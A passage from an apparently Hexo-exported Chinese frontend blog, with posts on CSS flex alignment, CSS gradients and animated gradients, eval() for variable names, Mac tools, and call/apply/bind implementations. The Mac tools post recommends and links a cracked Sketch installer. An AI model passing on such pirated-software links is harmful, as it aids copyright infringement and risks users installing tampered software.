<h3 id="align-items属性定义项目在交叉轴上如何对齐。"><a href="#align-items属性定义项目在交叉轴上如何对齐。" class="headerlink" title="align-items属性定义项目在交叉轴上如何对齐。"></a>align-items属性定义项目在交叉轴上如何对齐。</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-items</span>: flex-start | flex-end| center | baseline | stretch;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用"><a href="#align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用" class="headerlink" title="align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用"></a>align-content属性定义了多根轴线的对齐方式。如果项目只有一根轴线，该属性不起作用</h3><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.box</span> &#123;</span><br><span class="line">  <span class="attribute">align-content</span>: flex-start | flex-end| center | space-between | space-around | stretch;&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
        <tag>flex</tag>
      </tags>
  </entry>
  <entry>
    <title>css渐变与动态渐变</title>
    <url>/2019/01/css%E6%B8%90%E5%8F%98%E4%B8%8E%E5%8A%A8%E6%80%81%E6%B8%90%E5%8F%98.html</url>
    <content><![CDATA[<div style="
    width: 100%;
    height: 100px;
    background: linear-gradient(90deg, #496eaa, #944fa8, #a8804f, #944fa8, #496eaa);
    background-size: 1400% 300%;
    animation: dynamics 20s ease infinite;
    -webkit-animation: dynamics 20s ease infinite;
    -moz-animation: dynamics 20s ease infinite;"><br></div>

<p>渐变色已经很常见了，如何把渐变色做成动态变化或者做出更酷炫的效果？</p>
<a id="more"></a>
<h1 id="css渐变"><a href="#css渐变" class="headerlink" title="css渐变"></a>css渐变</h1><p>CSS 中设置的渐变是 gradient 数据类型，它是一种特别的image数据类型。使用<code>background-image</code>设置，可叠加设置多个；</p>
<p>CSS3 定义了两种类型的渐变（gradients）：</p>
<h2 id="线性渐变-linear-gradient"><a href="#线性渐变-linear-gradient" class="headerlink" title="线性渐变 linear-gradient()"></a>线性渐变 linear-gradient()</h2><p>渐变的实现由两部分组成：渐变线和色标。渐变线用来控制发生渐变的方向；色标包含一个颜色值和一个位置，用来控制渐变的颜色变化。浏览器从每个色标的颜色淡出到下一个，以创建平滑的渐变，通过确定多个色标可以制作多色渐变效果。<br>使用渐变色做背景已经很常见了：</p>
<figure class="highlight"><table><tr><td class="code"><pre><span class="line">background: linear-gradient(direction/angle, color-stop1, color-stop2, ...);</span><br></pre></td></tr></table></figure>
<h3 id="方向（direction）"><a href="#方向（direction）" class="headerlink" title="方向（direction）"></a>方向（direction）</h3><h4 id="从上到下（默认情况下）"><a href="#从上到下（默认情况下）" class="headerlink" title="从上到下（默认情况下）"></a>从上到下（默认情况下）</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(green, yellow);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="width: 100px; height: 100px; background: linear-gradient(green, yellow);"></div>

<h4 id="从左到右"><a href="#从左到右" class="headerlink" title="从左到右"></a>从左到右</h4><p>从右到左同理。<br>兼容性原因，不同浏览器写法不同：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, green, yellow); <span class="comment">/* 标准的语法 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(left, green, yellow); <span class="comment">/* Safari 5.1 - 6.0 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-o-linear-gradient</span>(right, green, yellow); <span class="comment">/* Opera 11.1 - 12.0 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(right, green, yellow); <span class="comment">/* Firefox 3.6 - 15 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="width: 100px; height: 100px; background: linear-gradient(to right, green, yellow);"></div>

<h4 id="对角"><a href="#对角" class="headerlink" title="对角"></a>对角</h4><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to bottom right, green, yellow); <span class="comment">/* 标准的语法 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-webkit-linear-gradient</span>(left top, green, yellow); <span class="comment">/* Safari 5.1 - 6.0 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-o-linear-gradient</span>(bottom right, green, yellow); <span class="comment">/* Opera 11.1 - 12.0 */</span></span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">-moz-linear-gradient</span>(bottom right, green, yellow); <span class="comment">/* Firefox 3.6 - 15 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="width: 100px; height: 100px; background: linear-gradient(to bottom right, green, yellow);"></div>

<h3 id="角度（deg）"><a href="#角度（deg）" class="headerlink" title="角度（deg）"></a>角度（deg）</h3><p><img src="http://static.simmzl.cn/deg.jpg" width="400"></p>
<p>0deg 将创建一个从下到上的渐变，90deg 将创建一个从左到右的渐变。</p>
<h3 id="色标-color-stop"><a href="#色标-color-stop" class="headerlink" title="色标 (color-stop)"></a>色标 (color-stop)</h3><p>由一个color值组成，并且跟随着一个可选的终点位置（可以是一个百分比值或者是沿着渐变轴的length）。</p>
<p>未设置位置时默认情况下颜色均匀分布。</p>
<p>有时候我们不希望一开始就出现渐变，可以从中间某个地方开始最好。这时候就可以使用百分比等了。</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(to right, green, white <span class="number">10%</span>, yellow);</span><br><span class="line">    <span class="comment">/* background: linear-gradient(to right, green, white 20px, yellow); 等同 */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>使用百分比：</p>
<div style="width: 200px; height: 100px; background: linear-gradient(to right, green, white 10%, yellow);"></div>

<p>使用长度：</p>
<div style="width: 200px; height: 100px; background: linear-gradient(to right, green, white 20px, yellow);"></div>

<p>中间的白色从容器10%的位置开始渐变，挤压了绿色区域；</p>
<h2 id="径向渐变-radial-gradient"><a href="#径向渐变-radial-gradient" class="headerlink" title="径向渐变 radial-gradient()"></a>径向渐变 radial-gradient()</h2><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(shape size at position, start-color, ..., last-color);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="shape"><a href="#shape" class="headerlink" title="shape"></a>shape</h3><ul>
<li><p>ellipse (默认): 椭圆形</p>
</li>
<li><p>circle ：圆形</p>
</li>
</ul>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(red, yellow, green);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="width: 200px; height: 150px; background: radial-gradient(red, yellow, green);"></div>

<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(circle, red, yellow, green);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="width: 200px; height: 150px; background: radial-gradient(circle, red, yellow, green);"></div>

<h3 id="size"><a href="#size" class="headerlink" title="size"></a>size</h3><p>定义渐变的大小:</p>
<ul>
<li><p>farthest-corner (默认) : 指定径向渐变的半径长度为从圆心到离圆心最远的角</p>
  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(ellipse farthest-corner at <span class="number">80px</span> <span class="number">50px</span>, red, yellow, green);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
  <div style="
      width: 200px;
      height: 150px;
      background: radial-gradient(ellipse at 80px 50px, red, yellow, green);"><br>  </div>
</li>
<li><p>closest-side ：渐变的边缘形状与容器距离渐变中心点最近的一边相切（圆形）或者至少与距离渐变中心点最近的垂直和水平边相切（椭圆）。</p>
  <figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(closest-side at <span class="number">80px</span> <span class="number">50px</span>, red, yellow, green);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="selector-class">.bar</span> &#123;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">radial-gradient</span>(circle closest-side at <span class="number">80px</span> <span class="number">50px</span>, red, yellow, green);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>  渐变椭圆与距中心点最近的垂直和水平边相切：</p>
  <div style="
      width: 200px;
      height: 150px;
      background: radial-gradient(circle closest-side at 80px 50px, red, yellow );"><br>  </div>

<p>  渐变圆与距中心点最近的垂直和水平边相切：</p>
  <div style="
      width: 200px;
      height: 150px;
      background: radial-gradient(circle closest-side at 80px 50px, red, yellow );"><br>  </div>
</li>
<li><p>closest-corner ： 指定径向渐变的半径长度为从圆心到离圆心最近的角</p>
  <div style="
      width: 200px;
      height: 150px;
      background: radial-gradient(closest-corner at 80px 50px, red, yellow, green );"><br>  </div>
</li>
<li><p>farthest-side ：与closest-side相反，边缘形状与容器距离渐变中心点最远的一边相切（或最远的垂直和水平边）。</p>
  <div style="
      width: 200px;
      height: 150px;
      background: radial-gradient(farthest-side at 80px 50px, red, yellow, green );"><br>  </div>

</li>
</ul>
<h3 id="position"><a href="#position" class="headerlink" title="position"></a>position</h3><p>position与background-position或者transform-origin类似。如缺省，默认为中心点center。</p>
<h3 id="color"><a href="#color" class="headerlink" title="color"></a>color</h3><p>与linear-gradient相似， color + 一个百分比值或者length;</p>
<h2 id="重复渐变-repeating"><a href="#重复渐变-repeating" class="headerlink" title="重复渐变 repeating"></a>重复渐变 repeating</h2><h3 id="repeating-linear-gradient"><a href="#repeating-linear-gradient" class="headerlink" title="repeating-linear-gradient()"></a>repeating-linear-gradient()</h3><figure class="highlight"><table><tr><td class="code"><pre><span class="line">background: repeating-linear-gradient(angle | to side-or-corner, color-stop1, color-stop2, ...);</span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-tag">background-image</span>: <span class="selector-tag">repeating-linear-gradient</span>(90<span class="selector-tag">deg</span>, <span class="selector-tag">red</span>, <span class="selector-tag">yellow</span> 10%);"&gt;</span><br></pre></td></tr></table></figure>
<div style="
    width: 200px;
    height: 100px;
    background-image: repeating-linear-gradient(90deg, green, yellow 20%);"><br></div>

<p>有趣的玩法：</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.foo</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">200px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background-image</span>: <span class="built_in">repeating-linear-gradient</span>(<span class="number">45deg</span>, orange, orange <span class="number">25px</span>, #FFF <span class="number">25px</span>, #FFF <span class="number">50px</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="
    width: 200px;
    height: 100px;
    background-color: orange;
    background-image: repeating-linear-gradient(90deg, transparent, transparent 25px, #FFF 25px, #FFF 50px);"><br></div>

<p>45deg:</p>
<div style="
    width: 200px;
    height: 100px;
    background-color: #000;
    background-image: repeating-linear-gradient(45deg, transparent, transparent 25px, #FFF 25px, #FFF 50px);"><br></div>

<p>.</p>
<div style="
    height: 10px;
    background-image: repeating-linear-gradient(135deg, orange, orange 10px, #FFF 10px, #FFF 20px);"><br></div>

<p>大佬使用渐变制作的近百个滑块示例: <a href="https://codepen.io/collection/DgYaMj/" target="_blank" rel="noopener">滑块示例</a></p>
<h3 id="repeating-radial-gradient"><a href="#repeating-radial-gradient" class="headerlink" title="repeating-radial-gradient()"></a>repeating-radial-gradient()</h3><p>通过使用<strong>background叠加</strong>，实现唱片效果：</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">'record'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.record</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: relative;</span><br><span class="line">    <span class="attribute">margin</span>: <span class="number">0</span> auto;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">260px</span>; <span class="attribute">height</span>: <span class="number">260px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">background</span>:</span><br><span class="line">        <span class="built_in">linear-gradient</span>(<span class="number">30deg</span>, transparent <span class="number">40%</span>, rgba(<span class="number">42</span>, <span class="number">41</span>, <span class="number">40</span>, .<span class="number">85</span>) <span class="number">40%</span>) no-repeat <span class="number">100%</span> <span class="number">0</span>,</span><br><span class="line">        <span class="built_in">linear-gradient</span>(<span class="number">60deg</span>, rgba(<span class="number">42</span>, <span class="number">41</span>, <span class="number">40</span>, .<span class="number">85</span>) <span class="number">60%</span>, transparent <span class="number">60%</span>) no-repeat <span class="number">0</span> <span class="number">100%</span>,</span><br><span class="line">        <span class="built_in">repeating-radial-gradient</span>(#<span class="number">2</span>a2928, #<span class="number">2</span>a2928 <span class="number">4px</span>, #ada9a0 <span class="number">5px</span>, #<span class="number">2</span>a2928 <span class="number">6px</span>);</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">50%</span> <span class="number">100%</span>, <span class="number">100%</span> <span class="number">50%</span>, <span class="number">100%</span> <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">5px</span> <span class="number">10px</span> <span class="number">20px</span> <span class="number">#ccc</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.record</span><span class="selector-pseudo">:after</span> &#123;</span><br><span class="line">    <span class="attribute">position</span>: absolute;</span><br><span class="line">    <span class="attribute">top</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">left</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">margin</span>: -<span class="number">35px</span>;</span><br><span class="line">    <span class="attribute">border</span>: solid <span class="number">1px</span> <span class="number">#d9a388</span>;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">68px</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">68px</span>;</span><br><span class="line">    <span class="attribute">border-radius</span>: <span class="number">50%</span>;</span><br><span class="line">    <span class="attribute">box-shadow</span>: <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">4px</span> <span class="number">#da5b33</span>,</span><br><span class="line">        inset <span class="number">0</span> <span class="number">0</span> <span class="number">0</span> <span class="number">27px</span> <span class="number">#da5b33</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="number">#fff</span>;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<div style="
    position: relative;
    margin: 0 auto;
    width: 260px; height: 260px;
    border-radius: 50%;
    background:
        linear-gradient(30deg, transparent 40%, rgba(42, 41, 40, .85) 40%) no-repeat 100% 0,
        linear-gradient(60deg, rgba(42, 41, 40, .85) 60%, transparent 60%) no-repeat 0 100%,
        repeating-radial-gradient(#2a2928, #2a2928 4px, #ada9a0 5px, #2a2928 6px);
    background-size: 50% 100%, 100% 50%, 100% 100%;
    box-shadow: 5px 10px 20px #ccc;"><br>    <div style="
        position: absolute;
        top: 50%;
        left: 50%;
        margin: -35px;
        border: solid 1px #d9a388;
        width: 68px;
        height: 68px;
        border-radius: 50%;
        box-shadow: 0 0 0 4px #da5b33,
            inset 0 0 0 27px #da5b33;
        background: #fff;
    "><br>    </div><br></div>

<p>附上：<a href="https://www.zhangxinxu.com/wordpress/2017/11/css3-radial-gradient-syntax-example/" target="_blank" rel="noopener">张鑫旭-10个demo示例学会CSS3 radial-gradient径向渐变</a></p>
<h2 id="动态变化"><a href="#动态变化" class="headerlink" title="动态变化"></a>动态变化</h2><p>通过预先设置好渐变，通过animation移动<code>background-position</code>来呈现渐变动态变化的效果。为了使动画首尾看上去无缝衔接，渐变的首尾颜色需相同；</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">"dynamics"</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.dynamics</span> &#123;</span><br><span class="line">    <span class="attribute">width</span>: <span class="number">100%</span>;</span><br><span class="line">    <span class="attribute">height</span>: <span class="number">100px</span>;</span><br><span class="line">    <span class="attribute">background</span>: <span class="built_in">linear-gradient</span>(<span class="number">90deg</span>, #<span class="number">496</span>eaa, #<span class="number">944</span>fa8, #a8804f, #<span class="number">944</span>fa8, #<span class="number">496</span>eaa);</span><br><span class="line">    <span class="attribute">background-size</span>: <span class="number">1400%</span> <span class="number">300%</span>;</span><br><span class="line">    <span class="attribute">animation</span>: dynamics <span class="number">20s</span> ease infinite;</span><br><span class="line">    <span class="attribute">-webkit-animation</span>: dynamics <span class="number">20s</span> ease infinite;</span><br><span class="line">    <span class="attribute">-moz-animation</span>: dynamics <span class="number">20s</span> ease infinite;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">@keyframes</span> dynamics &#123;</span><br><span class="line">    0% &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">0%</span> <span class="number">0%</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    50% &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">50%</span> <span class="number">100%</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    100% &#123;</span><br><span class="line">        <span class="attribute">background-position</span>: <span class="number">100%</span> <span class="number">0%</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>原始渐变：</p>
<div style="
    width: 100%;
    height: 100px;
    background: linear-gradient(90deg, #496eaa, #944fa8, #a8804f, #944fa8, #496eaa);"><br></div>

<p>加入动画后：</p>
<div style="
    width: 100%;
    height: 100px;
    background: linear-gradient(90deg, #496eaa, #944fa8, #a8804f, #944fa8, #496eaa);
    background-size: 1400% 300%;
    animation: dynamics 20s ease infinite;
    -webkit-animation: dynamics 20s ease infinite;
    -moz-animation: dynamics 20s ease infinite;"><br></div>

<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/linear-gradient" target="_blank" rel="noopener">MDN-linear-gradient</a></p>
<p><a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/radial-gradient" target="_blank" rel="noopener">MDN-radial-gradient</a></p>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>css</tag>
      </tags>
  </entry>
  <entry>
    <title>js中把字符串变成变量名</title>
    <url>/2017/08/js%E4%B8%AD%E6%8A%8A%E5%AD%97%E7%AC%A6%E4%B8%B2%E5%8F%98%E6%88%90%E5%8F%98%E9%87%8F%E5%90%8D.html</url>
    <content><![CDATA[<blockquote>
<p>定义：eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。</p>
</blockquote>
<p>做一个demo的时候遇到需要批量生成变量名的地方，如下：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myChart = <span class="string">"myChart"</span> + index;</span><br><span class="line">myChart.setOption(option);</span><br></pre></td></tr></table></figure>
<p>index为函数参数； 但是”myChart”只是一个字符串，并不是变量名！<br>搜索得出解决方法：</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> myChart = <span class="built_in">eval</span>(<span class="string">"myChart"</span> + index);</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>js</tag>
      </tags>
  </entry>
  <entry>
    <title>mac tools</title>
    <url>/2019/03/mac-tools.html</url>
    <content><![CDATA[<p>换了mbp，收集了一些工具…</p>
<a id="more"></a>
<h3 id="百度云链接下载避免限速"><a href="#百度云链接下载避免限速" class="headerlink" title="百度云链接下载避免限速"></a>百度云链接下载避免限速</h3><p>Chrome里BaiduExporter插件获取下载链接，自动导入至Aria2GUI全速下载：<a href="https://www.jianshu.com/p/29819b9ee40c?from=groupmessage" target="_blank" rel="noopener">教程</a></p>
<p>用户体验提升1000%；</p>
<h3 id="rar解压缩"><a href="#rar解压缩" class="headerlink" title="rar解压缩"></a>rar解压缩</h3><p>app store 搜索FileZip，免费无广告。</p>
<h3 id="sketch-破解版…"><a href="#sketch-破解版…" class="headerlink" title="sketch 破解版…"></a>sketch 破解版…</h3><p><a href="https://www.zhinin.com/sketch-mac.html" target="_blank" rel="noopener">破解版安装包</a></p>
<p><a href="https://github.com/cute/SketchI18N" target="_blank" rel="noopener">汉化：Shetchl18N</a></p>
<h3 id="paste"><a href="#paste" class="headerlink" title="paste"></a>paste</h3><p>app store 搜索，记录剪切板历史；</p>
<h3 id="截图"><a href="#截图" class="headerlink" title="截图"></a>截图</h3><p>app store 搜索，腾讯开发，可选区域录制视频、截图等，视频可直接粘贴，轻量</p>
<h3 id="Go2Shell"><a href="#Go2Shell" class="headerlink" title="Go2Shell"></a>Go2Shell</h3><p>直接在当前目录打开终端，巨方便！</p>
]]></content>
      <categories>
        <category>Tools</category>
      </categories>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>js基础之call、apply、bind原理与实现</title>
    <url>/2019/07/js%E5%9F%BA%E7%A1%80%E4%B9%8Bcall%E3%80%81apply%E3%80%81bind%E5%8E%9F%E7%90%86%E4%B8%8E%E5%AE%9E%E7%8E%B0.html</url>
    <content><![CDATA[<h2 id="三者区别"><a href="#三者区别" class="headerlink" title="三者区别"></a>三者区别</h2><ul>
<li><p>apply、call、bind 三者都是函数的一个方法，第一个参数都是 this 要指向的对象，也就是想指定的上下文；</p>
</li>
<li><p>apply、call、bind 三者都可以利用后续参数传参，其中只有<strong>apply()后续参数以数组</strong>形式传；</p>
</li>
<li><p>bind 是返回对应的绑定函数，便于稍后调用；apply、call 则是立即调用。</p>
</li>
</ul>
<a id="more"></a>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> parent = &#123;</span><br><span class="line">    age: <span class="number">30</span>,</span><br><span class="line">    <span class="comment">// 注意在用apply等时，这里不能用箭头函数，箭头定义时this已经指定，无法被apply等改变</span></span><br><span class="line">    run: <span class="function"><span class="keyword">function</span>(<span class="params">name</span>) </span>&#123; <span class="built_in">console</span>.log(<span class="keyword">this</span>.age, name) &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">const</span> child = &#123;</span><br><span class="line">    age: <span class="number">1</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">parent.run.apply(child, [<span class="string">"tom"</span>]); <span class="comment">// 1 tom // 立即执行</span></span><br><span class="line">parent.run.call(child, <span class="string">"tom"</span>); <span class="comment">// 1 tom // 立即执行</span></span><br><span class="line">parent.run.apply(<span class="literal">null</span>); <span class="comment">// undefined undefined // null 是window下的，表示this指向window</span></span><br><span class="line">parent.run.apply(<span class="literal">undefined</span>); <span class="comment">// undefined undefined // undefined 指向window</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fn = parent.run.bind(child, <span class="string">"tom"</span>); <span class="comment">// bind会返回一个函数</span></span><br><span class="line">fn(); <span class="comment">// 1 tom</span></span><br></pre></td></tr></table></figure>
<h2 id="原理-amp-实现"><a href="#原理-amp-实现" class="headerlink" title="原理 &amp; 实现"></a>原理 &amp; 实现</h2><h3 id="call-amp-apply"><a href="#call-amp-apply" class="headerlink" title="call &amp; apply"></a>call &amp; apply</h3><p>可以看看这个<a href="https://segmentfault.com/a/1190000009257663" target="_blank" rel="noopener">JavaScript深入之call和apply的模拟实现</a></p>
<p>fn.apply(obj, array)实现的原理：</p>
<ul>
<li>将要执行的函数fn设置为该对象obj的属性</li>
<li>执行obj.fn(args)函数</li>
<li>不能给这个obj对象新增新的属性，所以要删除这个属性；</li>
<li>其中对obj要做判断，为<strong>null或undefined</strong>时，要把this指向window</li>
</ul>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">Function</span>.prototype.call = <span class="function"><span class="keyword">function</span> (<span class="params">context</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为**null或undefined**时，要把this指向window</span></span><br><span class="line">    <span class="keyword">var</span> context = context || <span class="built_in">window</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数设置为obj的属性</span></span><br><span class="line">    context.fn = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 类数组解构参数</span></span><br><span class="line">    <span class="keyword">var</span> args = [...arguments].slice(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行函数</span></span><br><span class="line">    <span class="keyword">var</span> result = context.fn(...args);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除函数</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// apply与call不同只在于参数处理不用</span></span><br><span class="line"><span class="built_in">Function</span>.prototype.apply = <span class="function"><span class="keyword">function</span> (<span class="params">context, args</span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 首先判断是不是函数调用该方法，如果不是，则抛出异常</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="keyword">this</span> !== <span class="string">"function"</span>) <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">TypeError</span>(<span class="string">'Error'</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 为**null或undefined**时，要把this指向window</span></span><br><span class="line">    <span class="keyword">var</span> context = context || <span class="built_in">window</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 将函数设置为obj的属性</span></span><br><span class="line">    context.fn = <span class="keyword">this</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行函数</span></span><br><span class="line">    <span class="keyword">var</span> result;</span><br><span class="line">    <span class="keyword">if</span> (args) &#123;</span><br><span class="line">        result = context.fn(...args);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        result = context.fn();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 删除函数</span></span><br><span class="line">    <span class="keyword">delete</span> context.fn;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 返回执行结果</span></span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="bind"><a href="#bind" class="headerlink" title="bind"></a>bind</h3><p>bind其实是在call、apply基础上封装了一层，因此多次调用bind，只会第一次生效；</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">parent.run.bind(child, <span class="string">"tom"</span>).bind(child1, <span class="string">"jack"</span>).bind(child2, <span class="string">"Rachael"</span>)();</span><br><span class="line"><span class="comment">// 1 tom </span></span><br><span class="line"><span class="comment">// 并不会继续下去</span></span><br></pre></td></tr></table></figure>
<p><strong>简单的实现：</strong>（实际要复杂一些）</p>
